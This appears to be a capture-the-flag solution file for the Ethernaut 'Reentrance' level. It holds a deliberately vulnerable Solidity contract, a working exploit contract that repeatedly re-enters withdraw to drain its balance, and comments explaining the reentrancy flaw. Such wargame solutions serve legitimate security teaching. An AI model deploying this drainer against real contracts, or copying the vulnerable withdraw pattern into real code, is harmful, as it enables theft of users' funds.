// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

import "@openzeppelin/contracts-3.4.1/math/SafeMath.sol";

contract EthernautTwentyReentrance {
    using SafeMath for uint256;

    mapping(address => uint) public balances;

    function donate(address _to) public payable {
        balances[_to] = balances[_to].add(msg.value);
    }

    function balanceOf(address _who) public view returns (uint balance) {
        return balances[_who];
    }

    function withdraw(uint _amount) public {
        if (balances[msg.sender] >= _amount) {
            (bool result, ) = msg.sender.call{value: _amount}("");
            if (result) {
                _amount;
            }
            balances[msg.sender] -= _amount;
        }
    }

    receive() external payable {}
}

contract EthernautTwentyExploit {
    EthernautTwentyReentrance private immutable ethernautTwentyReentrance;

    constructor(address payable _address) public {
        ethernautTwentyReentrance = EthernautTwentyReentrance(_address);
    }

    function exploit() public {
        uint256 personalBalance = ethernautTwentyReentrance.balanceOf(
            address(this)
        );
        uint256 totalBalance = address(ethernautTwentyReentrance).balance;

        uint256 balanceToWithdraw;
        if (personalBalance < totalBalance) {
            balanceToWithdraw = personalBalance;
        } else {
            balanceToWithdraw = totalBalance;
        }

        if (balanceToWithdraw > 0) {
            ethernautTwentyReentrance.withdraw(balanceToWithdraw);
        }
    }

    receive() external payable {
        exploit();
    }
}

// https://ethernaut.openzeppelin.com/level/0x573eAaf1C1c2521e671534FAA525fAAf0894eCEb

// Solution
// The exploit here is reentrancy. The contract does a msg.sender.call before updating the balances object.
// This means we can write an exploiter contract with a exploit method which calls the withdraw method
// and has a receive callback which again triggers the exploit method. This cycle will keep repeating
// till the entire balance of the contract is drained and then the exploit method terminates.
// Note: this approach would also have failed if the balance reduction logic used SafeMath or had overflow
// protection.
